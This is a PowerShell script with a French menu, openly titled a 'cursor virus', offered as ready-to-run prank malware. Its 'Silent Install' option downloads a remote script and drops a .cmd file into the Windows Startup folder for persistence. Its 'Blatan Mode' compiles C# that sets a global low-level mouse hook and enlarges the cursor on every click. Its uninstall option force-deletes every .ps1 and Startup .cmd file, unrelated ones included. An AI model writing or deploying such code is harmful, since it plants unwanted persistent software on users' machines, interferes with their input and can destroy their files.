do {
[console]::WindowHeight = 40
[console]::WindowWidth = 90
"

╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                        Powershell Increase Cursor Virus                         ║
║  Author:                                                                        ║
║  https://github.com/WolfAnto                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                            Copyright (C) 2024 WolfAnto                          ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝													  
"
    Write-Host "Sélectionnez une option :`n"
    Write-Host " 1 : Silent Install"
    Write-Host " 2 : Uninstall"
    Write-Host " 3 : Blatan Mode"
    Write-Host " 4 : Quitter"

    $choice = Read-Host "Entrez le numéro de votre choix"

    switch ($choice) {
        1 {
            Write-Host "Installation silencieuse en cours..."
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/WolfAnto/powershell-IncreaseCursor-virus/main/IncreaseCursor.ps1" -OutFile "C:\Users\Public\Documents\IncreaseCursor.ps1"
            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/WolfAnto/powershell-IncreaseCursor-virus/main/VMWare.cmd" -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\VMWare.cmd"
            clear
            break

        }
        2 {

            Write-Host "Désinstallation des fichiers/traces..."
            Write-Host "Désinstallation des fichiers dans C:\users\Public\Documents..."
            remove-item -fo C:\Users\Public\Documents\*.ps1
            Write-Host "Désinstallation des fichiers dans votre dossier utilisateur..."
            remove-item -fo $env:USERPROFILE\*.ps1
            Write-Host "Désinstallation des fichiers dans le dossier Startup..."
            Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*.cmd"
            Write-Host "Désinstallation terminé !"
            Start-Sleep -Seconds 3
            break
			
        }
        3 {
Add-Type @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    public class InterceptMouse
    {
        private const int WH_MOUSE_LL = 14;
        private const int WM_LBUTTONDOWN = 0x0201;
        private static LowLevelMouseProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static uint cursorSize = 64; // Taille de curseur initiale
        
        public delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
        
        public static void Start()
        {
            _hookID = SetHook(_proc);
            //Console.WriteLine("Hook Started. Press Ctrl + C to exit.");
            System.Threading.Thread.CurrentThread.Join(); // Continue d'exécuter indéfiniment
        }
        
        private static IntPtr SetHook(LowLevelMouseProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_MOUSE_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_LBUTTONDOWN)
            {
                //Console.WriteLine("Left button clicked!");
                // Ajoutez ici le code pour l'action spécifique que vous souhaitez effectuer
                IncreaseCursorSize();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        private static void IncreaseCursorSize()
        {
            // Update cursor size
            bool result = SystemParametersInfo(0x2029, 0, cursorSize, 0x01);
            if (!result) {
                //Console.WriteLine("Failed to update cursor size.");
            }
            cursorSize += 5; // Augmente la taille du curseur de 5 à chaque clic
        }
        
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
"@ -PassThru | Out-Null

[InterceptMouse]::Start()
            break
        }
        4 {
            Write-Host "Au revoir !"
            Start-Sleep -Seconds 1
            break
        }
        
        default {
            Write-Host "Choix invalide. Veuillez entrer un numéro de la liste valide."
        }
    }
} while ($choice -ne "4")